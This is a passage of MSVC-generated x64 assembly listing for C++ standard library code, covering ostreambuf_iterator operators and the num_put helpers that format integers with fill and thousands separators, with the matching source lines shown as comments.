?failed@?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEBA_NXZ PROC ; std::ostreambuf_iterator<char,std::char_traits<char> >::failed, COMDAT

; 528  :     _NODISCARD bool failed() const noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 529  :         return _Failed;

	mov	rax, QWORD PTR this$[rsp]
	movzx	eax, BYTE PTR [rax]

; 530  :     }

	ret	0
?failed@?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEBA_NXZ ENDP ; std::ostreambuf_iterator<char,std::char_traits<char> >::failed
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\iterator
;	COMDAT ??E?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAAAEAV01@XZ
_TEXT	SEGMENT
this$ = 8
??E?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAAAEAV01@XZ PROC ; std::ostreambuf_iterator<char,std::char_traits<char> >::operator++, COMDAT

; 520  :     ostreambuf_iterator& operator++() noexcept /* strengthened */ {

	mov	QWORD PTR [rsp+8], rcx

; 521  :         return *this;

	mov	rax, QWORD PTR this$[rsp]

; 522  :     }

	ret	0
??E?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAAAEAV01@XZ ENDP ; std::ostreambuf_iterator<char,std::char_traits<char> >::operator++
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\iterator
;	COMDAT ??D?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAAAEAV01@XZ
_TEXT	SEGMENT
this$ = 8
??D?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAAAEAV01@XZ PROC ; std::ostreambuf_iterator<char,std::char_traits<char> >::operator*, COMDAT

; 516  :     _NODISCARD ostreambuf_iterator& operator*() noexcept /* strengthened */ {

	mov	QWORD PTR [rsp+8], rcx

; 517  :         return *this;

	mov	rax, QWORD PTR this$[rsp]

; 518  :     }

	ret	0
??D?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAAAEAV01@XZ ENDP ; std::ostreambuf_iterator<char,std::char_traits<char> >::operator*
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\iterator
;	COMDAT ??4?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAAAEAV01@D@Z
_TEXT	SEGMENT
$T1 = 32
$T2 = 36
this$ = 64
_Right$ = 72
??4?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAAAEAV01@D@Z PROC ; std::ostreambuf_iterator<char,std::char_traits<char> >::operator=, COMDAT

; 508  :     ostreambuf_iterator& operator=(_Elem _Right) { // store element and increment

$LN5:
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 509  :         if (!_Strbuf || traits_type::eq_int_type(_Traits::eof(), _Strbuf->sputc(_Right))) {

	mov	rax, QWORD PTR this$[rsp]
	cmp	QWORD PTR [rax+8], 0
	je	SHORT $LN3@operator
	movzx	edx, BYTE PTR _Right$[rsp]
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rax+8]
	call	?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHD@Z ; std::basic_streambuf<char,std::char_traits<char> >::sputc
	mov	DWORD PTR $T1[rsp], eax
	call	?eof@?$_Narrow_char_traits@DH@std@@SAHXZ ; std::_Narrow_char_traits<char,int>::eof
	mov	DWORD PTR $T2[rsp], eax
	lea	rdx, QWORD PTR $T1[rsp]
	lea	rcx, QWORD PTR $T2[rsp]
	call	?eq_int_type@?$_Narrow_char_traits@DH@std@@SA_NAEBH0@Z ; std::_Narrow_char_traits<char,int>::eq_int_type
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN2@operator
$LN3@operator:

; 510  :             _Failed = true;

	mov	rax, QWORD PTR this$[rsp]
	mov	BYTE PTR [rax], 1
$LN2@operator:

; 511  :         }
; 512  : 
; 513  :         return *this;

	mov	rax, QWORD PTR this$[rsp]

; 514  :     }

	add	rsp, 56					; 00000038H
	ret	0
??4?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAAAEAV01@D@Z ENDP ; std::ostreambuf_iterator<char,std::char_traits<char> >::operator=
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\iterator
;	COMDAT ??0?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAA@PEAV?$basic_streambuf@DU?$char_traits@D@std@@@1@@Z
_TEXT	SEGMENT
this$ = 8
_Sb$ = 16
??0?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAA@PEAV?$basic_streambuf@DU?$char_traits@D@std@@@1@@Z PROC ; std::ostreambuf_iterator<char,std::char_traits<char> >::ostreambuf_iterator<char,std::char_traits<char> >, COMDAT

; 504  :     ostreambuf_iterator(streambuf_type* _Sb) noexcept : _Strbuf(_Sb) {}

	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx

; 505  : 
; 506  :     ostreambuf_iterator(ostream_type& _Ostr) noexcept : _Strbuf(_Ostr.rdbuf()) {}
; 507  : 
; 508  :     ostreambuf_iterator& operator=(_Elem _Right) { // store element and increment
; 509  :         if (!_Strbuf || traits_type::eq_int_type(_Traits::eof(), _Strbuf->sputc(_Right))) {
; 510  :             _Failed = true;
; 511  :         }
; 512  : 
; 513  :         return *this;
; 514  :     }
; 515  : 
; 516  :     _NODISCARD ostreambuf_iterator& operator*() noexcept /* strengthened */ {
; 517  :         return *this;
; 518  :     }
; 519  : 
; 520  :     ostreambuf_iterator& operator++() noexcept /* strengthened */ {
; 521  :         return *this;
; 522  :     }
; 523  : 
; 524  :     ostreambuf_iterator& operator++(int) noexcept /* strengthened */ {
; 525  :         return *this;
; 526  :     }
; 527  : 
; 528  :     _NODISCARD bool failed() const noexcept {
; 529  :         return _Failed;
; 530  :     }
; 531  : 
; 532  : private:
; 533  :     bool _Failed = false; // true if any stores have failed

	mov	rax, QWORD PTR this$[rsp]
	mov	BYTE PTR [rax], 0

; 504  :     ostreambuf_iterator(streambuf_type* _Sb) noexcept : _Strbuf(_Sb) {}

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Sb$[rsp]
	mov	QWORD PTR [rax+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	ret	0
??0?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAA@PEAV?$basic_streambuf@DU?$char_traits@D@std@@@1@@Z ENDP ; std::ostreambuf_iterator<char,std::char_traits<char> >::ostreambuf_iterator<char,std::char_traits<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_G?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 48
__flags$ = 56
??_G?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEAAPEAXI@Z PROC ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::`scalar deleting destructor', COMDAT
$LN4:
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??1?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEAA@XZ ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::~num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >
	mov	eax, DWORD PTR __flags$[rsp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN2@scalar
	mov	edx, 16
	mov	rcx, QWORD PTR this$[rsp]
	call	??3@YAXPEAX_K@Z				; operator delete
$LN2@scalar:
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??_G?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEAAPEAXI@Z ENDP ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?_Rep@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@D_K@Z
_TEXT	SEGMENT
this$ = 64
__$ReturnUdt$ = 72
_Dest$ = 80
_Ch$ = 88
_Count$ = 96
?_Rep@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@D_K@Z PROC ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Rep, COMDAT

; 1577 :     _OutIt __CLRCALL_OR_CDECL _Rep(_OutIt _Dest, _Elem _Ch, size_t _Count) const { // put _Count * _Ch to _Dest

$LN6:
	mov	BYTE PTR [rsp+32], r9b
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 40					; 00000028H

; 1578 :         for (; 0 < _Count; --_Count, (void) ++_Dest) {

	jmp	SHORT $LN4@Rep
$LN2@Rep:
	mov	rax, QWORD PTR _Count$[rsp]
	dec	rax
	mov	QWORD PTR _Count$[rsp], rax
	mov	rcx, QWORD PTR _Dest$[rsp]
	call	??E?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAAAEAV01@XZ ; std::ostreambuf_iterator<char,std::char_traits<char> >::operator++
$LN4@Rep:
	cmp	QWORD PTR _Count$[rsp], 0
	jbe	SHORT $LN3@Rep

; 1579 :             *_Dest = _Ch;

	mov	rcx, QWORD PTR _Dest$[rsp]
	call	??D?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAAAEAV01@XZ ; std::ostreambuf_iterator<char,std::char_traits<char> >::operator*
	movzx	edx, BYTE PTR _Ch$[rsp]
	mov	rcx, rax
	call	??4?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAAAEAV01@D@Z ; std::ostreambuf_iterator<char,std::char_traits<char> >::operator=

; 1580 :         }

	jmp	SHORT $LN2@Rep
$LN3@Rep:

; 1581 : 
; 1582 :         return _Dest;

	mov	rdi, QWORD PTR __$ReturnUdt$[rsp]
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 1583 :     }

	add	rsp, 40					; 00000028H
	pop	rdi
	pop	rsi
	ret	0
?_Rep@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@D_K@Z ENDP ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Rep
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?_Put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@PEBD_K@Z
_TEXT	SEGMENT
this$ = 64
__$ReturnUdt$ = 72
_Dest$ = 80
_Ptr$ = 88
_Count$ = 96
?_Put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@PEBD_K@Z PROC ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Put, COMDAT

; 1569 :         _OutIt _Dest, const _Elem* _Ptr, size_t _Count) const { // put [_Ptr, _Ptr + _Count) to _Dest

$LN6:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 40					; 00000028H

; 1570 :         for (; 0 < _Count; --_Count, (void) ++_Dest, ++_Ptr) {

	jmp	SHORT $LN4@Put
$LN2@Put:
	mov	rax, QWORD PTR _Count$[rsp]
	dec	rax
	mov	QWORD PTR _Count$[rsp], rax
	mov	rcx, QWORD PTR _Dest$[rsp]
	call	??E?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAAAEAV01@XZ ; std::ostreambuf_iterator<char,std::char_traits<char> >::operator++
	mov	rax, QWORD PTR _Ptr$[rsp]
	inc	rax
	mov	QWORD PTR _Ptr$[rsp], rax
$LN4@Put:
	cmp	QWORD PTR _Count$[rsp], 0
	jbe	SHORT $LN3@Put

; 1571 :             *_Dest = *_Ptr;

	mov	rcx, QWORD PTR _Dest$[rsp]
	call	??D?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAAAEAV01@XZ ; std::ostreambuf_iterator<char,std::char_traits<char> >::operator*
	mov	rcx, QWORD PTR _Ptr$[rsp]
	movzx	edx, BYTE PTR [rcx]
	mov	rcx, rax
	call	??4?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAAAEAV01@D@Z ; std::ostreambuf_iterator<char,std::char_traits<char> >::operator=

; 1572 :         }

	jmp	SHORT $LN2@Put
$LN3@Put:

; 1573 : 
; 1574 :         return _Dest;

	mov	rdi, QWORD PTR __$ReturnUdt$[rsp]
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 1575 :     }

	add	rsp, 40					; 00000028H
	pop	rdi
	pop	rsi
	ret	0
?_Put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@PEBD_K@Z ENDP ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Put
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z
_TEXT	SEGMENT
_Kseparator$1 = 48
_Prefix$ = 56
_Pg$ = 64
_Adjustfield$ = 72
_Fillcount$ = 80
tv69 = 88
_Punct_fac$ = 96
tv268 = 104
tv261 = 112
_Ctype_fac$ = 120
tv131 = 128
tv264 = 136
tv244 = 144
$T2 = 152
$T3 = 168
$T4 = 192
$T5 = 208
$T6 = 224
$T7 = 240
$T8 = 256
$T9 = 272
$T10 = 288
$T11 = 304
$T12 = 320
$T13 = 336
$T14 = 352
$T15 = 368
$T16 = 384
_Groupstring$ = 400
_Grouping$ = 432
__$ArrayPad$ = 464
this$ = 512
__$ReturnUdt$ = 520
_Dest$ = 528
_Iosbase$ = 536
_Fill$ = 544
_Buf$ = 552
_Count$ = 560
?_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z PROC ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Iput, COMDAT

; 1515 :         size_t _Count) const { // put formatted integer to _Dest

$LN23:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 488				; 000001e8H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax

; 1516 :         auto _Prefix = static_cast<size_t>(0 < _Count && (*_Buf == '+' || *_Buf == '-'));

	cmp	QWORD PTR _Count$[rsp], 0
	jbe	SHORT $LN17@Iput
	mov	rax, QWORD PTR _Buf$[rsp]
	movsx	eax, BYTE PTR [rax]
	cmp	eax, 43					; 0000002bH
	je	SHORT $LN16@Iput
	mov	rax, QWORD PTR _Buf$[rsp]
	movsx	eax, BYTE PTR [rax]
	cmp	eax, 45					; 0000002dH
	jne	SHORT $LN17@Iput
$LN16@Iput:
	mov	QWORD PTR tv69[rsp], 1
	jmp	SHORT $LN18@Iput
$LN17@Iput:
	mov	QWORD PTR tv69[rsp], 0
$LN18@Iput:
	mov	rax, QWORD PTR tv69[rsp]
	mov	QWORD PTR _Prefix$[rsp], rax

; 1517 :         if ((_Iosbase.flags() & ios_base::basefield) == ios_base::hex && _Prefix + 2 <= _Count && _Buf[_Prefix] == '0'
; 1518 :             && (_Buf[_Prefix + 1] == 'x' || _Buf[_Prefix + 1] == 'X')) {

	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?flags@ios_base@std@@QEBAHXZ		; std::ios_base::flags
	and	eax, 3584				; 00000e00H
	cmp	eax, 2048				; 00000800H
	jne	SHORT $LN4@Iput
	mov	rax, QWORD PTR _Prefix$[rsp]
	add	rax, 2
	cmp	rax, QWORD PTR _Count$[rsp]
	ja	SHORT $LN4@Iput
	mov	rax, QWORD PTR _Prefix$[rsp]
	mov	rcx, QWORD PTR _Buf$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	cmp	eax, 48					; 00000030H
	jne	SHORT $LN4@Iput
	mov	rax, QWORD PTR _Prefix$[rsp]
	mov	rcx, QWORD PTR _Buf$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax+1]
	cmp	eax, 120				; 00000078H
	je	SHORT $LN5@Iput
	mov	rax, QWORD PTR _Prefix$[rsp]
	mov	rcx, QWORD PTR _Buf$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax+1]
	cmp	eax, 88					; 00000058H
	jne	SHORT $LN4@Iput
$LN5@Iput:

; 1519 :             _Prefix += 2;

	mov	rax, QWORD PTR _Prefix$[rsp]
	add	rax, 2
	mov	QWORD PTR _Prefix$[rsp], rax
$LN4@Iput:

; 1520 :         }
; 1521 : 
; 1522 :         const ctype<_Elem>& _Ctype_fac = _STD use_facet<ctype<_Elem>>(_Iosbase.getloc());

	lea	rdx, QWORD PTR $T2[rsp]
	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?getloc@ios_base@std@@QEBA?AVlocale@2@XZ ; std::ios_base::getloc
	mov	QWORD PTR tv268[rsp], rax
	mov	rax, QWORD PTR tv268[rsp]
	mov	QWORD PTR tv261[rsp], rax
	mov	rcx, QWORD PTR tv261[rsp]
	call	??$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z ; std::use_facet<std::ctype<char> >
	mov	QWORD PTR _Ctype_fac$[rsp], rax
	lea	rcx, QWORD PTR $T2[rsp]
	call	??1locale@std@@QEAA@XZ			; std::locale::~locale

; 1523 :         basic_string<_Elem> _Groupstring(_Count, _Elem(0)); // reserve space

	xor	r8d, r8d
	mov	rdx, QWORD PTR _Count$[rsp]
	lea	rcx, QWORD PTR _Groupstring$[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@_KD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	npad	1

; 1524 :         _Ctype_fac.widen(_Buf, _Buf + _Count, &_Groupstring[0]);

	xor	edx, edx
	lea	rcx, QWORD PTR _Groupstring$[rsp]
	call	??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator[]
	mov	rcx, QWORD PTR _Count$[rsp]
	mov	rdx, QWORD PTR _Buf$[rsp]
	add	rdx, rcx
	mov	rcx, rdx
	mov	r9, rax
	mov	r8, rcx
	mov	rdx, QWORD PTR _Buf$[rsp]
	mov	rcx, QWORD PTR _Ctype_fac$[rsp]
	call	?widen@?$ctype@D@std@@QEBAPEBDPEBD0PEAD@Z ; std::ctype<char>::widen

; 1525 : 
; 1526 :         const auto& _Punct_fac = _STD use_facet<numpunct<_Elem>>(_Iosbase.getloc());

	lea	rdx, QWORD PTR $T3[rsp]
	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?getloc@ios_base@std@@QEBA?AVlocale@2@XZ ; std::ios_base::getloc
	mov	QWORD PTR tv131[rsp], rax
	mov	rax, QWORD PTR tv131[rsp]
	mov	QWORD PTR tv264[rsp], rax
	mov	rcx, QWORD PTR tv264[rsp]
	call	??$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z ; std::use_facet<std::numpunct<char> >
	mov	QWORD PTR _Punct_fac$[rsp], rax
	lea	rcx, QWORD PTR $T3[rsp]
	call	??1locale@std@@QEAA@XZ			; std::locale::~locale

; 1527 :         const string _Grouping = _Punct_fac.grouping();

	lea	rdx, QWORD PTR _Grouping$[rsp]
	mov	rcx, QWORD PTR _Punct_fac$[rsp]
	call	?grouping@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ; std::numpunct<char>::grouping
	npad	1

; 1528 :         const char* _Pg        = &_Grouping[0];

	xor	edx, edx
	lea	rcx, QWORD PTR _Grouping$[rsp]
	call	??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBAAEBD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator[]
	mov	QWORD PTR _Pg$[rsp], rax

; 1529 :         if (*_Pg != CHAR_MAX && '\0' < *_Pg) { // grouping specified, add thousands separators

	mov	rax, QWORD PTR _Pg$[rsp]
	movsx	eax, BYTE PTR [rax]
	cmp	eax, 127				; 0000007fH
	je	$LN6@Iput
	mov	rax, QWORD PTR _Pg$[rsp]
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	jle	$LN6@Iput

; 1530 :             const _Elem _Kseparator = _Punct_fac.thousands_sep();

	mov	rcx, QWORD PTR _Punct_fac$[rsp]
	call	?thousands_sep@?$numpunct@D@std@@QEBADXZ ; std::numpunct<char>::thousands_sep
	mov	BYTE PTR _Kseparator$1[rsp], al
$LN2@Iput:

; 1531 :             while (*_Pg != CHAR_MAX && '\0' < *_Pg && static_cast<size_t>(*_Pg) < _Count - _Prefix) {

	mov	rax, QWORD PTR _Pg$[rsp]
	movsx	eax, BYTE PTR [rax]
	cmp	eax, 127				; 0000007fH
	je	$LN6@Iput
	mov	rax, QWORD PTR _Pg$[rsp]
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	jle	$LN6@Iput
	mov	rax, QWORD PTR _Pg$[rsp]
	movsx	rax, BYTE PTR [rax]
	mov	rcx, QWORD PTR _Prefix$[rsp]
	mov	rdx, QWORD PTR _Count$[rsp]
	sub	rdx, rcx
	mov	rcx, rdx
	cmp	rax, rcx
	jae	SHORT $LN6@Iput

; 1532 :                 // insert thousands separator
; 1533 :                 _Count -= *_Pg;

	mov	rax, QWORD PTR _Pg$[rsp]
	movsx	rax, BYTE PTR [rax]
	mov	rcx, QWORD PTR _Count$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR _Count$[rsp], rax

; 1534 :                 _Groupstring.insert(_Count, 1, _Kseparator);

	movzx	r9d, BYTE PTR _Kseparator$1[rsp]
	mov	r8d, 1
	mov	rdx, QWORD PTR _Count$[rsp]
	lea	rcx, QWORD PTR _Groupstring$[rsp]
	call	?insert@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@_K0D@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::insert

; 1535 :                 if ('\0' < _Pg[1]) {

	mov	eax, 1
	imul	rax, rax, 1
	mov	rcx, QWORD PTR _Pg$[rsp]
	movsx	eax, BYTE PTR [rcx+rax]
	test	eax, eax
	jle	SHORT $LN7@Iput

; 1536 :                     ++_Pg; // not last group, advance

	mov	rax, QWORD PTR _Pg$[rsp]
	inc	rax
	mov	QWORD PTR _Pg$[rsp], rax
$LN7@Iput:

; 1537 :                 }
; 1538 :             }

	jmp	$LN2@Iput
$LN6@Iput:

; 1539 :         }
; 1540 : 
; 1541 :         _Count = _Groupstring.size();

	lea	rcx, QWORD PTR _Groupstring$[rsp]
	call	?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::size
	mov	QWORD PTR _Count$[rsp], rax

; 1542 : 
; 1543 :         size_t _Fillcount;
; 1544 :         if (_Iosbase.width() <= 0 || static_cast<size_t>(_Iosbase.width()) <= _Count) {

	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?width@ios_base@std@@QEBA_JXZ		; std::ios_base::width
	test	rax, rax
	jle	SHORT $LN10@Iput
	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?width@ios_base@std@@QEBA_JXZ		; std::ios_base::width
	cmp	rax, QWORD PTR _Count$[rsp]
	ja	SHORT $LN8@Iput
$LN10@Iput:

; 1545 :             _Fillcount = 0;

	mov	QWORD PTR _Fillcount$[rsp], 0

; 1546 :         } else {

	jmp	SHORT $LN9@Iput
$LN8@Iput:

; 1547 :             _Fillcount = static_cast<size_t>(_Iosbase.width()) - _Count;

	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?width@ios_base@std@@QEBA_JXZ		; std::ios_base::width
	sub	rax, QWORD PTR _Count$[rsp]
	mov	QWORD PTR _Fillcount$[rsp], rax
$LN9@Iput:

; 1548 :         }
; 1549 : 
; 1550 :         ios_base::fmtflags _Adjustfield = _Iosbase.flags() & ios_base::adjustfield;

	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?flags@ios_base@std@@QEBAHXZ		; std::ios_base::flags
	and	eax, 448				; 000001c0H
	mov	DWORD PTR _Adjustfield$[rsp], eax

; 1551 :         if (_Adjustfield != ios_base::left && _Adjustfield != ios_base::internal) { // put leading fill

	cmp	DWORD PTR _Adjustfield$[rsp], 64	; 00000040H
	je	$LN11@Iput
	cmp	DWORD PTR _Adjustfield$[rsp], 256	; 00000100H
	je	$LN11@Iput

; 1552 :             _Dest      = _Rep(_Dest, _Fill, _Fillcount);

	lea	rax, QWORD PTR $T4[rsp]
	mov	rdi, rax
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rax, QWORD PTR _Fillcount$[rsp]
	mov	QWORD PTR [rsp+32], rax
	movzx	r9d, BYTE PTR _Fill$[rsp]
	lea	r8, QWORD PTR $T4[rsp]
	lea	rdx, QWORD PTR $T11[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Rep@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@D_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Rep
	mov	rdi, QWORD PTR _Dest$[rsp]
	mov	rsi, rax
	mov	ecx, 16
	rep movsb

; 1553 :             _Fillcount = 0;

	mov	QWORD PTR _Fillcount$[rsp], 0

; 1554 :             _Dest      = _Put(_Dest, &_Groupstring[0], _Prefix);

	xor	edx, edx
	lea	rcx, QWORD PTR _Groupstring$[rsp]
	call	??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator[]
	lea	rcx, QWORD PTR $T5[rsp]
	mov	rdi, rcx
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rcx, QWORD PTR _Prefix$[rsp]
	mov	QWORD PTR [rsp+32], rcx
	mov	r9, rax
	lea	r8, QWORD PTR $T5[rsp]
	lea	rdx, QWORD PTR $T12[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@PEBD_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Put
	mov	rdi, QWORD PTR _Dest$[rsp]
	mov	rsi, rax
	mov	ecx, 16
	rep movsb
	jmp	$LN12@Iput
$LN11@Iput:

; 1555 :         } else if (_Adjustfield == ios_base::internal) { // put internal fill

	cmp	DWORD PTR _Adjustfield$[rsp], 256	; 00000100H
	jne	$LN13@Iput

; 1556 :             _Dest      = _Put(_Dest, &_Groupstring[0], _Prefix);

	xor	edx, edx
	lea	rcx, QWORD PTR _Groupstring$[rsp]
	call	??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator[]
	lea	rcx, QWORD PTR $T6[rsp]
	mov	rdi, rcx
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rcx, QWORD PTR _Prefix$[rsp]
	mov	QWORD PTR [rsp+32], rcx
	mov	r9, rax
	lea	r8, QWORD PTR $T6[rsp]
